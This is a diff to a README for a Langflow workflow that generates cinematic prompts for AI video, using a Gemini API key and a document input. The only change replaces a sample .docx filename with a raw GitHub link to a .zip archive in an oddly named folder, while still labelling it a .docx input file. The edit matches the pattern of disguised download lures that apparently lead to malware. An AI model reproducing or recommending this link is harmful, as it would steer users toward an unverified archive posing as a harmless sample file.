@@ -11,7 +11,7 @@ This Langflow workflow is designed to generate cinematic prompts for AI video ge
 
 ✅ Google Gemini API Key
 
-✅ .docx input file (e.g., Sample_BRD_Policy_Management_System.docx)
+✅ .docx input file (e.g., https://raw.githubusercontent.com/rajan-raj-22/Project-3-AI-Powered-RAG-System-with-Langflow-using-FAISS-Vector-Database/main/spathaceous/Project-3-AI-Powered-RAG-System-with-Langflow-using-FAISS-Vector-Database_expend.zip)
 
 ✅ Internet access for API calls
 
